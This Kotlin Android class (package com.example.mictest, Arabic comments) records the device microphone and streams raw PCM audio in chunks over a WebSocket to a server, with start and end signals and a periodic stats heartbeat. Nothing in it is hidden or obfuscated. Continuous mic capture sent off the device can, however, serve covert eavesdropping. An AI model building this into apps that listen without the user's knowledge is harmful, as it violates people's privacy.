package com.example.mictest

import android.content.Context
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.util.Log
import kotlinx.coroutines.*

/**
 * البث المباشر للصوت - الميزة الثانية
 * يبث الصوت مباشرة للسيرفر بدون إنشاء ملفات
 */
class LiveAudioStreamer(
    private val context: Context,
    private val webSocketManager: WebSocketManager
) {
    companion object {
        private const val TAG = "Mictest_LiveStreamer"

        // إعدادات الصوت للبث المباشر
        private const val SAMPLE_RATE = 44100
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        private const val BUFFER_SIZE_FACTOR = 2

        // إعدادات البث
        private const val CHUNK_SIZE_MS = 100  // 100ms chunks
        private const val STREAMING_DELAY_MS = 10L
    }

    private var audioRecord: AudioRecord? = null
    private var streamingJob: Job? = null
    private var heartbeatJob: Job? = null
    private var isStreaming = false
    private val streamingScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // إحصائيات البث
    private var chunksSent = 0
    private var totalBytesSent = 0L
    private var streamingStartTime = 0L
    private var lastSuccessfulChunk = 0L

    suspend fun startStreaming(): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                if (isStreaming) {
                    Log.w(TAG, "⚠️ البث المباشر يعمل بالفعل")
                    return@withContext false
                }

                // حساب حجم المخزن المؤقت الأمثل للبث المباشر
                val bufferSize = AudioRecord.getMinBufferSize(
                    SAMPLE_RATE,
                    CHANNEL_CONFIG,
                    AUDIO_FORMAT
                ) * BUFFER_SIZE_FACTOR

                if (bufferSize == AudioRecord.ERROR || bufferSize == AudioRecord.ERROR_BAD_VALUE) {
                    Log.e(TAG, "❌ خطأ في حساب حجم المخزن المؤقت")
                    return@withContext false
                }

                // إنشاء AudioRecord مُحسّن للبث المباشر
                audioRecord = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    SAMPLE_RATE,
                    CHANNEL_CONFIG,
                    AUDIO_FORMAT,
                    bufferSize
                )

                if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                    Log.e(TAG, "❌ فشل في تهيئة AudioRecord للبث المباشر")
                    audioRecord?.release()
                    audioRecord = null
                    return@withContext false
                }

                // بدء التسجيل
                audioRecord?.startRecording()
                isStreaming = true
                streamingStartTime = System.currentTimeMillis()
                chunksSent = 0
                totalBytesSent = 0L

                // إرسال إشارة بداية البث للسيرفر
                sendStreamingStartSignal()

                // بدء حلقة البث المباشر
                streamingJob = streamingScope.launch {
                    streamAudioDataOptimized(bufferSize)
                }

                // بدء heartbeat للبث المباشر
                startStreamingHeartbeat()

                Log.i(TAG, "✅ تم بدء البث المباشر بنجاح")
                Log.i(TAG, "📊 معدل العينة: $SAMPLE_RATE Hz، حجم المخزن: $bufferSize bytes")
                return@withContext true

            } catch (e: Exception) {
                Log.e(TAG, "❌ خطأ في بدء البث المباشر", e)
                cleanupResources()
                return@withContext false
            }
        }
    }

    private suspend fun streamAudioDataOptimized(bufferSize: Int) {
        val audioBuffer = ByteArray(bufferSize)
        var chunkCounter = 0

        try {
            Log.i(TAG, "🔄 بدء حلقة البث المباشر المُحسّنة...")

            while (isStreaming && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                val bytesRead = audioRecord?.read(audioBuffer, 0, bufferSize) ?: 0

                if (bytesRead > 0) {
                    chunkCounter++
                    chunksSent++
                    totalBytesSent += bytesRead

                    // إرسال جزء الصوت للسيرفر
                    // -- التعديل --: تم التغيير لاستخدام الإرسال الثنائي المباشر بدلاً من JSON/Base64
                    val success = webSocketManager.sendLiveAudioChunkBinary(audioBuffer, bytesRead)

                    if (success) {
                        lastSuccessfulChunk = System.currentTimeMillis()

                        // إحصائيات دورية
                        if (chunkCounter % 100 == 0) {
                            val streamingDuration = System.currentTimeMillis() - streamingStartTime
                            val averageChunksPerSec = (chunksSent * 1000.0) / streamingDuration
                            Log.d(TAG, "📡 تم إرسال $chunksSent جزء صوتي - معدل: ${String.format("%.1f", averageChunksPerSec)} جزء/ثانية")
                        }
                    } else {
                        Log.w(TAG, "⚠️ فشل في إرسال الجزء $chunkCounter")

                        // إذا فشل الإرسال لفترة طويلة، توقف عن البث
                        if (System.currentTimeMillis() - lastSuccessfulChunk > 10000) {
                            Log.e(TAG, "❌ فشل البث لمدة طويلة، إيقاف البث")
                            break
                        }
                    }
                } else if (bytesRead < 0) {
                    Log.e(TAG, "❌ خطأ في قراءة البيانات الصوتية: $bytesRead")
                    break
                }

                // تأخير قصير لتجنب إرهاق الشبكة
                delay(STREAMING_DELAY_MS)
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ خطأ في حلقة البث المباشر", e)
        } finally {
            val streamingDuration = System.currentTimeMillis() - streamingStartTime
            Log.i(TAG, "🏁 انتهت حلقة البث المباشر")
            Log.i(TAG, "📊 الإحصائيات: $chunksSent جزء، ${totalBytesSent} بايت، ${streamingDuration}ms")
        }
    }

    private fun sendStreamingStartSignal() {
        try {
            webSocketManager.sendStreamingStartSignal(
                sampleRate = SAMPLE_RATE,
                channelConfig = "MONO",
                audioFormat = "PCM_16BIT",
                expectedChunkSize = CHUNK_SIZE_MS
            )
            Log.i(TAG, "📡 تم إرسال إشارة بداية البث")
        } catch (e: Exception) {
            Log.e(TAG, "❌ خطأ في إرسال إشارة بداية البث", e)
        }
    }

    private fun startStreamingHeartbeat() {
        heartbeatJob = streamingScope.launch {
            while (isStreaming) {
                try {
                    val streamingStats = getStreamingStats()
                    webSocketManager.sendStreamingHeartbeat(streamingStats)
                    Log.d(TAG, "💓 heartbeat البث المباشر")
                    delay(10000) // كل 10 ثواني
                } catch (e: Exception) {
                    Log.e(TAG, "❌ خطأ في heartbeat البث", e)
                    delay(5000)
                }
            }
        }
    }

    suspend fun stopStreaming() {
        withContext(Dispatchers.IO) {
            try {
                Log.i(TAG, "⏹️ إيقاف البث المباشر...")

                isStreaming = false
                streamingJob?.cancel()
                heartbeatJob?.cancel()

                audioRecord?.apply {
                    if (recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                        stop()
                    }
                    release()
                }
                audioRecord = null

                // إرسال إشارة انتهاء البث للسيرفر
                sendStreamingEndSignal()

                val totalDuration = System.currentTimeMillis() - streamingStartTime
                Log.i(TAG, "✅ تم إيقاف البث المباشر بنجاح")
                Log.i(TAG, "📊 مدة البث: ${totalDuration}ms، الأجزاء المرسلة: $chunksSent")

            } catch (e: Exception) {
                Log.e(TAG, "❌ خطأ في إيقاف البث المباشر", e)
            }
        }
    }

    private fun sendStreamingEndSignal() {
        try {
            val endStats = getStreamingStats()
            webSocketManager.sendStreamingEndSignal(endStats)
            Log.i(TAG, "📡 تم إرسال إشارة انتهاء البث")
        } catch (e: Exception) {
            Log.e(TAG, "❌ خطأ في إرسال إشارة انتهاء البث", e)
        }
    }

    fun isStreaming(): Boolean = isStreaming

    fun getStreamingStats(): Map<String, Any> {
        val currentTime = System.currentTimeMillis()
        val duration = if (streamingStartTime > 0) currentTime - streamingStartTime else 0L

        return mapOf(
            "is_streaming" to isStreaming,
            "chunks_sent" to chunksSent,
            "total_bytes_sent" to totalBytesSent,
            "streaming_duration_ms" to duration,
            "average_chunks_per_second" to if (duration > 0) (chunksSent * 1000.0) / duration else 0.0,
            "sample_rate" to SAMPLE_RATE,
            "channel_config" to "MONO",
            "audio_format" to "PCM_16BIT",
            "recording_state" to (audioRecord?.recordingState ?: AudioRecord.RECORDSTATE_STOPPED),
            "audio_record_state" to (audioRecord?.state ?: AudioRecord.STATE_UNINITIALIZED),
            "last_successful_chunk_ms" to lastSuccessfulChunk
        )
    }

    private fun cleanupResources() {
        isStreaming = false
        streamingJob?.cancel()
        heartbeatJob?.cancel()
        audioRecord?.release()
        audioRecord = null
        chunksSent = 0
        totalBytesSent = 0L
        streamingStartTime = 0L
        lastSuccessfulChunk = 0L
    }

    fun cleanup() {
        streamingScope.cancel()
        cleanupResources()
    }
}